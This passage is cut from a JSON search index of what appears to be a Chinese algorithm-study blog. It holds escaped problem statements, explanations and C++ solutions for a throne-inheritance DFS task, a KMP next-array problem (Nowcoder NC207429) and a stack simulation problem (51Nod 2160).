\u53e6\u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 class ThroneInheritance { unordered_map<string, vector<string>> mp; unordered_set<string> dead; string king; public: ThroneInheritance(string kingName) { king = kingName; mp[kingName]; } void birth(string parentName, string childName) { //\u5efa\u56fe mp[parentName].push_back(childName); } void death(string name) { //\u8bb0\u5f55\u6b7b\u4ea1\u7684 dead.insert(name); } vector<string> getInheritanceOrder() { vector<string> ans; //\u6df1\u5ea6\u4f18\u5148\u641c\u7d22 dfs(king, ans); return ans; } void dfs(string& people, vector<string>& ans) { // \u82e5\u7ee7\u627f\u4eba\u5b58\u6d3b\uff0c\u653e\u5165\u7ed3\u679c if (dead.find(people) == dead.end()) ans.push_back(people); // \u505c\u6b62\u641c\u7d22\u6761\u4ef6 if (mp[people].size() == 0) return; // \u7ee7\u7eed\u641c\u7d22\u6761\u4ef6 for (auto& child : mp[people]) dfs(child, ans); } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/","text":"\u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.2. Problem Description # \u6709\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u5bf9\u4e8e\u5b57\u7b26\u4e32\u4e2d\u4e00\u4e2a\u975e\u524d\u7f00\u5b50\u4e32\u6070\u597d\u4e3a\u5b57\u7b26\u4e32\u7684\u524d\u7f00\u6211\u4eec\u79f0\u4e4b\u4e3aac\u4e32\u3002 \u8bf7\u95ee\u7ed9\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u4ed6\u7684ac\u4e32\u6700\u5927\u957f\u5ea6\u4e3a\u591a\u5c11\u3002 1.3. Input # \u8f93\u5165\u6570\u636e\u7b2c\u4e00\u884c\u662f t \uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570\uff0c\u63a5\u4e0b\u6765\u6bcf\u7ec4\u6570\u636e\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32 s\uff08t \\le 10\uff0cs \\le 1e5\uff09 \u3002 1.4. Output # \u8f93\u51fa\u6700\u5927\u957f\u5ea6 1.5. Sample Input # 2 aaaaa abacc 1.6. Sample Output # 4 1 1.7. Note # aaaab\u7684ac\u4e32\u662faaa(2:4) acac\u7684ac\u4e32\u662fac(3:4) 1.8. Source # \u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c 2. \u89e3\u8bfb # \u6211\u4eec\u6709\u4e86\u4e00\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32 s \uff0c\u8bbe\u5176\u975e\u524d\u7f00\u5b50\u4e32\u4e3a x \uff0c x \\in s[1:size(s)] \uff0c\u5176\u4e2d size(s) \u4e3a\u5b57\u7b26\u4e32 s \u7684\u957f\u5ea6\uff0c [a:b] \u4e3a\u5de6\u95ed\u53f3\u5f00\u533a\u95f4\u3002\u8fd9\u9053\u9898\u76ee\u60f3\u8981\u6c42\u7684\u662f\u6700\u5927\u957f\u5ea6\u7684\u975e\u524d\u7f00\u5b50\u4e32 x \uff0c\u6ee1\u8db3 s[0:size(x)] == x \u3002 \u8fd9\u6070\u597d\u5c31\u7c7b\u4f3c\u4e8e KMP\u7b97\u6cd5 \u4e2d next \u6570\u7ec4 \u7684\u5b9a\u4e49\u3002 next[i] = k \u5176\u4e2d i \u8868\u793a\u6211\u4eec\u8981\u5224\u65ad\u7684\u662f\u5b57\u7b26\u4e32 s \u7684\u957f\u5ea6\u4e3a i + 1 \u7684\u5b50\u4e32 m = s[0:i + 1] \uff0c k \u8868\u793a m \u7684\u524d k \u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u5b50\u4e32\u4e0e\u540e k \u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u975e\u524d\u7f00\u5b50\u4e32\u76f8\u7b49\uff0c\u5373 m[0:k] == m[size(m) - k:size(m)] size(m) - k > 0 \u4f8b\u5982 aaaab \u7684 next \u6570\u7ec4\u4e3a \\{0, 1, 2, 3, 0\\} \uff0c\u9898\u76ee\u8981\u6c42\u7684ac\u4e32\u5c31\u662f next \u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u4e5f\u5c31\u662f aaa \u3002 \u63a8\u8350\u4e00\u4e2a KMP\u7b97\u6cd5\u7684\u53ef\u89c6\u5316\u7f51\u7ad9 \uff0c\u91cc\u9762\u8fd8\u6709\u5404\u79cd\u7b97\u6cd5\u7684\u53ef\u89c6\u5316\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7406\u89e3\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> using namespace std; const int MAXN = 1e5 + 1; int Next[MAXN] = { 0 }; int getNext(string p, int length) { Next[0] = 0; Next[1] = 0; for (int i = 1; i < length; i++) { int j = Next[i]; while (j && p[i] != p[j]) { j = Next[j]; } Next[i + 1] = (p[i] == p[j]) ? j + 1 : 0; } return 0; } int main() { int t, maxN; string str; cin >> t; while (t--) { cin >> str; maxN = 0; getNext(str, str.size()); for (size_t i = 1; i <= str.size(); i++) { maxN = max(Next[i], maxN); } cout << maxN << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#nc207429","text":"","title":"\u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#_1","text":"\u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#12-problem-description","text":"\u6709\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u5bf9\u4e8e\u5b57\u7b26\u4e32\u4e2d\u4e00\u4e2a\u975e\u524d\u7f00\u5b50\u4e32\u6070\u597d\u4e3a\u5b57\u7b26\u4e32\u7684\u524d\u7f00\u6211\u4eec\u79f0\u4e4b\u4e3aac\u4e32\u3002 \u8bf7\u95ee\u7ed9\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u4ed6\u7684ac\u4e32\u6700\u5927\u957f\u5ea6\u4e3a\u591a\u5c11\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#13-input","text":"\u8f93\u5165\u6570\u636e\u7b2c\u4e00\u884c\u662f t \uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570\uff0c\u63a5\u4e0b\u6765\u6bcf\u7ec4\u6570\u636e\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32 s\uff08t \\le 10\uff0cs \\le 1e5\uff09 \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#14-output","text":"\u8f93\u51fa\u6700\u5927\u957f\u5ea6","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#15-sample-input","text":"2 aaaaa abacc","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#16-sample-output","text":"4 1","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#17-note","text":"aaaab\u7684ac\u4e32\u662faaa(2:4) acac\u7684ac\u4e32\u662fac(3:4)","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#18-source","text":"\u725b\u5ba2\u7f51 NC207429 \u6700\u5927\u503c","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#2","text":"\u6211\u4eec\u6709\u4e86\u4e00\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32 s \uff0c\u8bbe\u5176\u975e\u524d\u7f00\u5b50\u4e32\u4e3a x \uff0c x \\in s[1:size(s)] \uff0c\u5176\u4e2d size(s) \u4e3a\u5b57\u7b26\u4e32 s \u7684\u957f\u5ea6\uff0c [a:b] \u4e3a\u5de6\u95ed\u53f3\u5f00\u533a\u95f4\u3002\u8fd9\u9053\u9898\u76ee\u60f3\u8981\u6c42\u7684\u662f\u6700\u5927\u957f\u5ea6\u7684\u975e\u524d\u7f00\u5b50\u4e32 x \uff0c\u6ee1\u8db3 s[0:size(x)] == x \u3002 \u8fd9\u6070\u597d\u5c31\u7c7b\u4f3c\u4e8e KMP\u7b97\u6cd5 \u4e2d next \u6570\u7ec4 \u7684\u5b9a\u4e49\u3002 next[i] = k \u5176\u4e2d i \u8868\u793a\u6211\u4eec\u8981\u5224\u65ad\u7684\u662f\u5b57\u7b26\u4e32 s \u7684\u957f\u5ea6\u4e3a i + 1 \u7684\u5b50\u4e32 m = s[0:i + 1] \uff0c k \u8868\u793a m \u7684\u524d k \u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u5b50\u4e32\u4e0e\u540e k \u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u975e\u524d\u7f00\u5b50\u4e32\u76f8\u7b49\uff0c\u5373 m[0:k] == m[size(m) - k:size(m)] size(m) - k > 0 \u4f8b\u5982 aaaab \u7684 next \u6570\u7ec4\u4e3a \\{0, 1, 2, 3, 0\\} \uff0c\u9898\u76ee\u8981\u6c42\u7684ac\u4e32\u5c31\u662f next \u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u4e5f\u5c31\u662f aaa \u3002 \u63a8\u8350\u4e00\u4e2a KMP\u7b97\u6cd5\u7684\u53ef\u89c6\u5316\u7f51\u7ad9 \uff0c\u91cc\u9762\u8fd8\u6709\u5404\u79cd\u7b97\u6cd5\u7684\u53ef\u89c6\u5316\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7406\u89e3\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/KMP%E7%AE%97%E6%B3%95/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207429_%E6%9C%80%E5%A4%A7%E5%80%BC/#3","text":"#include <algorithm> #include <iostream> using namespace std; const int MAXN = 1e5 + 1; int Next[MAXN] = { 0 }; int getNext(string p, int length) { Next[0] = 0; Next[1] = 0; for (int i = 1; i < length; i++) { int j = Next[i]; while (j && p[i] != p[j]) { j = Next[j]; } Next[i + 1] = (p[i] == p[j]) ? j + 1 : 0; } return 0; } int main() { int t, maxN; string str; cin >> t; while (t--) { cin >> str; maxN = 0; getNext(str, str.size()); for (size_t i = 1; i <= str.size(); i++) { maxN = max(Next[i], maxN); } cout << maxN << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/","text":"51Nod 2160 \u6570\u5b57\u6e38\u620f # \u76ee\u5f55 # 51Nod 2160 \u6570\u5b57\u6e38\u620f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u73b0\u5728\u6709 n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u4e00\u4e2a\u6808\uff0c\u6bcf\u4e2a\u6570\u5b57 a \u8fdb\u5165\u6808\u7684\u65f6\u5019\uff0c\u5982\u679c\u6808\u9876\u5143\u7d20\u5c0f\u4e8e a \uff0c\u5219\u4f1a\u5c06\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff0c\u65b0\u7684\u6808\u9876\u5143\u7d20\u5982\u679c\u4ecd\u7136\u5c0f\u4e8e a \uff0c\u5219\u4f1a\u5c06\u65b0\u7684\u6808\u9876\u5143\u7d20\u7ee7\u7eed\u5f39\u51fa\uff0c\u76f4\u5230\u6808\u9876\u5143\u7d20\u5927\u4e8e\u7b49\u4e8e a \u4e3a\u6b62\uff0c a \u624d\u4f1a\u52a0\u5165\u6808\u3002\u95ee n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u540e\uff0c\u6700\u540e\u6808\u91cc\u7684\u6570\u5b57\u4f9d\u6b21\u662f\uff1f 1.3. Input # \u8f93\u5165\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 n(n \\le 100000) \uff0c\u8868\u793a\u6709 n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u6808\u3002 \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u7b2c i \u4e2a\u6570\u5b57\u3002 1.4. Output # \u82e5\u5e72\u884c\uff0c\u8868\u793a\u6700\u540e\u6808\u4e2d\u7684\u6570\u5b57\u3002 1.5. Sample Input # 5 5 3 2 4 1 1.6. Sample Output # 5 4 1 1.7. Source # 51Nod 2160 \u6570\u5b57\u6e38\u620f 2. \u89e3\u8bfb # \u4f7f\u7528STL\u4e2d\u7684 Vector \u6309\u7167\u9898\u76ee\u4e2d\u7684\u8981\u6c42\u6a21\u62df\u6808\u7684\u5165\u6808\u51fa\u6808\u5373\u53ef\u3002 \u6ce8 \uff1a\u5728\u5224\u65ad\u6808\u9876\u5143\u7d20\u662f\u5426\u5c0f\u4e8e\u5373\u5c06\u5165\u6808\u7684\u5143\u7d20\u7684 for \u5faa\u73af\u4e2d\uff0c\u4e0d\u80fd\u4f7f\u7528 i < stack.size() \u6765\u5224\u65ad\u662f\u5426\u8df3\u51fa\u5faa\u73af\uff0c\u56e0\u4e3a\u51fa\u6808\u65f6 stack.size() \u4f1a\u51cf 1 \uff0c\u8fd9\u6837\u4f7f\u7528\u4f1a\u5bfc\u81f4\u5faa\u73af\u6700\u591a\u53ea\u80fd\u904d\u5386\u4e00\u534a\u6808\u4e2d\u7684\u5143\u7d20\u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> #include <vector> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6808 vector<int> stack; // \u6808\u7684\u6df1\u5ea6 long long stackDepth = 0l; // buffer long long buffer; // \u82e5\u5927\u4e8e0 if (n > 0) { // \u8bfb\u53d6\u7b2c\u4e00\u4e2a\u5143\u7d20 scanf(\"%lld\", &buffer); // \u5165\u6808 stack.push_back(buffer); // \u6df1\u5ea6\u52a01 stackDepth++; // \u8bfb\u5165\u5165\u6808\u5143\u7d20 for (long long i = 1; i < n; i++) { // \u8bfb\u53d6\u8f93\u5165 scanf(\"%lld\", &buffer); size_t sizeBuffer = stackDepth; for (size_t j = 0; j < sizeBuffer; j++) { // \u82e5\u6808\u9876\u5143\u7d20\u5c0f\u4e8e\u5373\u5c06\u65b0\u5165\u6808\u7684\u5143\u7d20buffer if (stack[stackDepth - 1] < buffer && stackDepth > 0) { // \u6808\u9876\u5143\u7d20\u51fa\u6808 stack.pop_back(); // \u6df1\u5ea6\u51cf1 stackDepth--; } else { break; } } // \u5143\u7d20\u5165\u6808 stack.push_back(buffer); // \u6df1\u5ea6\u52a01 stackDepth++; } // \u8f93\u51fa\u6808\u5185\u5143\u7d20 for (size_t i = 0; i < stack.size(); i++) { printf(\"%d\\n\", stack[i]); } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.51Nod 2160 \u6570\u5b57\u6e38\u620f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#51nod-2160","text":"","title":"51Nod 2160 \u6570\u5b57\u6e38\u620f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#_1","text":"51Nod 2160 \u6570\u5b57\u6e38\u620f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#12-problem-description","text":"\u73b0\u5728\u6709 n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u4e00\u4e2a\u6808\uff0c\u6bcf\u4e2a\u6570\u5b57 a \u8fdb\u5165\u6808\u7684\u65f6\u5019\uff0c\u5982\u679c\u6808\u9876\u5143\u7d20\u5c0f\u4e8e a \uff0c\u5219\u4f1a\u5c06\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff0c\u65b0\u7684\u6808\u9876\u5143\u7d20\u5982\u679c\u4ecd\u7136\u5c0f\u4e8e a \uff0c\u5219\u4f1a\u5c06\u65b0\u7684\u6808\u9876\u5143\u7d20\u7ee7\u7eed\u5f39\u51fa\uff0c\u76f4\u5230\u6808\u9876\u5143\u7d20\u5927\u4e8e\u7b49\u4e8e a \u4e3a\u6b62\uff0c a \u624d\u4f1a\u52a0\u5165\u6808\u3002\u95ee n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u540e\uff0c\u6700\u540e\u6808\u91cc\u7684\u6570\u5b57\u4f9d\u6b21\u662f\uff1f","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#13-input","text":"\u8f93\u5165\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 n(n \\le 100000) \uff0c\u8868\u793a\u6709 n \u4e2a\u6570\u5b57\u4f9d\u6b21\u8fdb\u5165\u6808\u3002 \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u7b2c i \u4e2a\u6570\u5b57\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#14-output","text":"\u82e5\u5e72\u884c\uff0c\u8868\u793a\u6700\u540e\u6808\u4e2d\u7684\u6570\u5b57\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#15-sample-input","text":"5 5 3 2 4 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#16-sample-output","text":"5 4 1","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#17-source","text":"51Nod 2160 \u6570\u5b57\u6e38\u620f","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#2","text":"\u4f7f\u7528STL\u4e2d\u7684 Vector \u6309\u7167\u9898\u76ee\u4e2d\u7684\u8981\u6c42\u6a21\u62df\u6808\u7684\u5165\u6808\u51fa\u6808\u5373\u53ef\u3002 \u6ce8 \uff1a\u5728\u5224\u65ad\u6808\u9876\u5143\u7d20\u662f\u5426\u5c0f\u4e8e\u5373\u5c06\u5165\u6808\u7684\u5143\u7d20\u7684 for \u5faa\u73af\u4e2d\uff0c\u4e0d\u80fd\u4f7f\u7528 i < stack.size() \u6765\u5224\u65ad\u662f\u5426\u8df3\u51fa\u5faa\u73af\uff0c\u56e0\u4e3a\u51fa\u6808\u65f6 stack.size() \u4f1a\u51cf 1 \uff0c\u8fd9\u6837\u4f7f\u7528\u4f1a\u5bfc\u81f4\u5faa\u73af\u6700\u591a\u53ea\u80fd\u904d\u5386\u4e00\u534a\u6808\u4e2d\u7684\u5143\u7d20\u3002","title":"2. 